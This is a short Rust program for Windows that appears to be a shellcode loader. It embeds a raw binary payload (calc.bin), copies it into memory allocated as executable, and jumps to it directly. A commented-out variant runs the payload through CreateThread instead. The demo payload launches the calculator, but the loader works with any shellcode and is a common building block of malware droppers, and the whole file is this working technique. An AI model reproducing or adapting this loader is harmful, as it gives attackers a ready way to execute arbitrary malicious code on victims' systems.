use std::mem::transmute;
use winapi::ctypes::c_void;
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::memoryapi::VirtualAlloc;
// use winapi::um::processthreadsapi::CreateThread;
// use winapi::um::synchapi::WaitForSingleObject;

fn main() {
    let buffer = include_bytes!("..\\..\\calc.bin");

    unsafe {
        let ptr = VirtualAlloc(std::ptr::null_mut(), buffer.len(), 0x00001000, 0x40);

        if GetLastError() == 0 {
            std::ptr::copy(buffer.as_ptr() as *const u8, ptr as *mut u8, buffer.len());

            let exec = transmute::<*mut c_void, fn()>(ptr);
            exec();

            //     let mut threadid = 0;
            //     let threadhandle = CreateThread(
            //         std::ptr::null_mut(),
            //         0,
            //         Some(transmute(ptr)),
            //         std::ptr::null_mut(),
            //         0,
            //         &mut threadid,
            //     );

            //     WaitForSingleObject(threadhandle, 0xFFFFFFFF);
            // } else {
            //     println!("执行失败：{}", GetLastError());
            // }
        }
    }
}
